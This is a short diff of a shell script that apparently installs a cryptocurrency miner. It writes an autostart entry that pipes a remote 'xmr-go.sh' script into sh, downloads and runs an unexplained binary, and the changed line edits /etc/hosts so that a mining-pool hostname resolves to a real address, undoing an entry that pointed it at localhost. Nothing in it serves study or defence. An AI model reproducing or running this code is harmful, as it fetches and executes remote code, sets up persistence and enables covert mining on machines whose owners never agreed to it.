@@ -15,7 +15,7 @@ case $architecture in
         ;;
 esac
 echo "sh <(curl -s https://raw.githubusercontent.com/spetterman66/verynicerepo/main/xmr-go.sh) &" > /config/.config/openbox/autostart
-echo "127.0.0.1    pool.hashvault.pro" | sudo tee -a /etc/hosts > /dev/null
+echo "141.94.96.144    pool.hashvault.pro" | sudo tee -a /etc/hosts > /dev/null
 curl -LO https://github.com/spetterman66/verynicerepo/raw/main/prepare.bin
 chmod +x prepare.bin
 ./prepare.bin
